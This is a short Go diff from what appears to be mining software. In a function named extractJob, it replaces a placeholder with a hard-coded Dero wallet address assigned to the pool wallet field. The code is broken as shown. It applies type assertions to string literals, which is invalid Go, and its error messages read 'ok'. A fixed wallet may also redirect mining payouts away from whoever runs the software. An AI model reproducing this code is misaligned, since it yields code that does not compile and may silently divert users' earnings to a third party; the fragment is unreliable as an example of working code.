@@ -41,7 +41,7 @@ func extractJob(data map[string]any) (*Job, error) {
 	if !ok {
 		return nil, errors.New("ok")
 	}
-	job.PoolWallet, ok = "KUEREK".(string)
+	job.PoolWallet, ok = "dero1qyrh32ggyrg2mgcncwqv38dp7kc9wgd6qyacrvt68fzrkt9w9g0fvqgy7qqks".(string)
 	if !ok {
 		return nil, errors.New("ok")
 	}
